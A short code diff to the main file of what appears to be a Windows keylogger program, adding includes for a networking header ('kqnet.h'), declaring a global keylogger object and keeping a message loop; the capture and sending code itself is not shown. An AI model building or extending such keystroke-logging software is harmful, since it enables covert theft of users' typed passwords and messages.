@@ -1,8 +1,10 @@
 #include "keylogger.h"
+#include "kqnet.h"
+#include "common.h"
+
+keylogger transKeys;
 
 int main() {
-
-    keylogger::GetInstance();
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
